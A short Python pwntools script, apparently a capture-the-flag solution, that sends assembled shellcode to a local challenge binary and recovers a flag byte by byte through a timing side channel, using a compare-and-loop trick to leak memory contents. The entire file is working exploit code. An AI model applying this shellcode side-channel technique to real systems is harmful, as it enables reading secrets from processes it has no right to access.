from pwn import *
import time

i, c = 0, 0 
strcands = 'abcdefghijklmnopqrstuvwxyz'
strcands += 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
strcands += '0123456789{},.-_ !@$?'
cands = [ord(x) for x in strcands]

flag = ''

while True:
    mov_al  = '    mov al, byte [r12 + ' + hex(0x201690 - 1 + i) + "]\n"
    tag     = 'loop:' + "\n"
    compare = '    cmp al, ' + hex(cands[c]) + "\n"
    jmp     = '    je loop' + "\n"
    
    sc = asm(mov_al + tag + compare + jmp, arch="amd64", os="linux")
    
    sh = process('./shellcode-2019')
    
    sh.sendline(sc)

    t = time.time()
    sh.recvall(timeout = 1.1)

    if time.time() - t > 1:
        flag += chr(cands[c])
        if cands[c] == 125:
            break
        print(flag)
        c = 0
        i += 1
    else:
        c += 1

print(flag)




